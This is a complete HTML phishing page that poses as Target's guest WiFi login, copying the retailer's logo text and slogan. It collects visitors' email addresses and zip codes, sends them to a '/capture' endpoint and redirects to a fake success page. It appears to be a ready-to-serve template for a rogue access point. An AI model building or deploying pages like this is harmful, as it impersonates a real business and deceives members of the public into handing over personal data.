<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Target WiFi</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial;background:linear-gradient(135deg,#cc0000,#ff6b6b);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.container{background:white;border-radius:10px;max-width:400px;width:100%;padding:40px 30px}.logo h1{color:#cc0000;font-size:32px;text-align:center;margin-bottom:10px}.logo p{color:#666;font-size:14px;text-align:center;margin-bottom:30px}h2{color:#333;text-align:center;margin-bottom:25px;font-size:20px}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;color:#555;font-weight:500}input{width:100%;padding:12px;border:2px solid #ddd;border-radius:5px;font-size:14px}input:focus{outline:none;border-color:#cc0000}button{width:100%;padding:14px;background:#cc0000;color:white;border:none;border-radius:25px;font-size:16px;font-weight:bold;cursor:pointer}button:hover{background:#b30000}</style></head><body><div class="container"><div class="logo"><h1>TARGET</h1><p>Expect More. Pay Less.</p></div><h2>Guest WiFi</h2><form id="loginForm"><div class="form-group"><label>Email</label><input type="email" id="email" required placeholder="your@email.com"></div><div class="form-group"><label>Zip Code</label><input type="text" id="zip" required placeholder="12345"></div><button type="submit">Connect</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();const email=document.getElementById('email').value;const zip=document.getElementById('zip').value;console.log('[Target] Email:',email,'Zip:',zip);fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({portal:'Target',email:email,zip:zip})}).catch(err=>console.log(err));window.location.href='success.html';});</script></body></html>
